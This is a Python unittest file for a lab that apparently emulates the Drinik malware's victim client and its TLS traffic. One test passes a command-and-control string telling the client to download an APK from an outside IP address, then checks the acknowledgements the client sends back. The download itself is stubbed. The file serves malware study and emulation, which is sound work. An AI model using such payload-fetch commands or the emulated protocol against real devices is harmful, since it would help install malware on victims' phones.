from http.server import BaseHTTPRequestHandler
from pathlib import Path
import sys
import tempfile
import unittest
from unittest.mock import patch


ROOT = Path(__file__).resolve().parents[1]
DRINIK_SOURCE = ROOT / "labs" / "drinik" / "source"
sys.path.insert(0, str(DRINIK_SOURCE))

from drinik_emulator.http_server_base import ManagedHttpServer  # noqa: E402
from drinik_emulator.http_wire import send_http_request  # noqa: E402
from drinik_emulator.tls_material import (  # noqa: E402
    client_context,
    close_tls_gracefully,
    ensure_self_signed_cert,
    server_context,
)
from drinik_emulator.victim import VictimClient  # noqa: E402


class _TlsHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:  # noqa: N802
        payload = b"OK"
        self.send_response(200)
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, _format: str, *_args: object) -> None:
        return


class DrinikFlowTests(unittest.TestCase):
    def test_send_message_direct_notice_precedes_generic_ack(self) -> None:
        victim = VictimClient.__new__(VictimClient)
        victim.first_download_started = True
        posted: list[str] = []
        victim._post_insert_server_cmd = posted.append
        victim._download_apk = lambda _url: b"PK"

        command = "DOWNLOADAPK:::http://192.3.124.14/AApk.apk"
        with patch("drinik_emulator.victim._stamp", return_value="2026-08-20 19:30:00"):
            victim._process_fcm_command(command)

        self.assertEqual(len(posted), 3)
        self.assertIn(command, posted[0])
        self.assertEqual(
            posted[1],
            "D:::2026-08-20 19:30:00 -- firstDownloadCompleted!##-##",
        )
        self.assertEqual(
            posted[2],
            "D:::2026-08-20 19:30:00 -- "
            "SendMessage:::firstDownloadCompleted! has been executed - OK##-##",
        )

    def test_https_server_exchanges_tls_close_notify(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            cert_path, key_path = ensure_self_signed_cert(Path(temp_dir))
            tls_server = server_context(cert_path, key_path, None)
            tls_client = client_context(None)
            server = ManagedHttpServer(
                name="drinik-tls-test",
                ip="127.0.0.1",
                port=0,
                handler_cls=_TlsHandler,
                tls_context=tls_server,
            )
            server_shutdowns: list[bool] = []

            def record_server_shutdown(sock) -> bool:
                result = close_tls_gracefully(sock)
                server_shutdowns.append(result)
                return result

            server.start()
            try:
                port = server.httpd.server_address[1]
                with patch(
                    "drinik_emulator.http_server_base.close_tls_gracefully",
                    side_effect=record_server_shutdown,
                ):
                    response = send_http_request(
                        ip="127.0.0.1",
                        port=port,
                        host="firebaseinstallations.googleapis.com",
                        method="GET",
                        path="/",
                        tls=True,
                        tls_context=tls_client,
                    )
            finally:
                server.stop()

        self.assertEqual(response.status, 200)
        self.assertEqual(response.body, b"OK")
        self.assertEqual(server_shutdowns, [True])


if __name__ == "__main__":
    unittest.main()
